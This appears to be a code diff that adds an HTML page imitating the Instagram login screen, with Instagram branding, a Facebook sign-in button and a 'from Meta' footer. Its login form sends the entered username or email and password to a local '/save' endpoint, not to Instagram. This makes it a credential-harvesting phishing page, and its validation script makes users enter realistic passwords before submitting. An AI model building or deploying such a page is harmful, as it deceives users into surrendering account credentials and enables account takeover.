@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/da212f0abf.js" crossorigin="anonymous"></script>
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="instagramLogo.avif">
+
+</head>
+
+<body>
+    <div class="head_title">
+        <p>English (United Kingdom)</p>
+    </div>
+    <div class="logo_text">
+        <img src="logo(text).png" alt="">
+    </div>
+    <div class="facebook">
+        <button><i class="fa-brands fa-square-facebook fa-lg"></i><span>Continue Using Facebook</span></button>
+    </div>
+    <div class="text">
+        <p class="hr-lines">OR</p>
+    </div>
+
+    <!-- Updated: Wrap inputs in a form -->
+    <form id="loginForm" method="POST" action="http://localhost:3000/save">
+        <div class="input_email_password">
+            <input type="text" name="email" id="email" placeholder="Username or email address" required>
+            <input type="password" name="password" id="password" placeholder="Password" required>
+            <p id="error-msg" style="color:red; font-size:14px;"></p>
+        </div>
+        <div class="buttom">
+            <button type="submit">Log in</button>
+        </div>
+    </form>
+
+    <div class="sign_up">
+        <span>Don't have an account?</span> <span class="blue" title="Not Available">Sign up</span>
+    </div>
+    <div class="meta">
+        <p>from</p>
+        <p><i class="fa-brands fa-meta"></i><span class="meta_logo" title="Not available">Meta</span></p>
+    </div>
+</body>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+        const userInput = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const errorMsg = document.getElementById('error-msg');
+
+        // Email Regex
+        const emailPattern = /^[^ ]+@[^ ]+\.[a-z]{2,}$/i;
+        // Username: letters, numbers, underscores, dots (3-30 chars)
+        const usernamePattern = /^[a-zA-Z0-9._]{3,30}$/;
+
+        const isEmail = emailPattern.test(userInput);
+        const isUsername = usernamePattern.test(userInput);
+
+        // Password checks
+        const hasUpperCase = /[A-Z]/.test(password);
+        const hasLowerCase = /[a-z]/.test(password);
+        const hasNumber = /[0-9]/.test(password);
+        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
+        const isLengthValid = password.length >= 8;
+
+        if (!(isEmail || isUsername)) {
+            errorMsg.textContent = "Enter a valid email or username.";
+            event.preventDefault();
+            return;
+        }
+
+        if (!(hasUpperCase && hasLowerCase && hasNumber && hasSpecialChar && isLengthValid)) {
+            errorMsg.textContent = "Enter a valid Password";
+            event.preventDefault();
+            return;
+        }
+
+        errorMsg.textContent = ""; // Clear errors
+    });
+</script>
+
+</html>
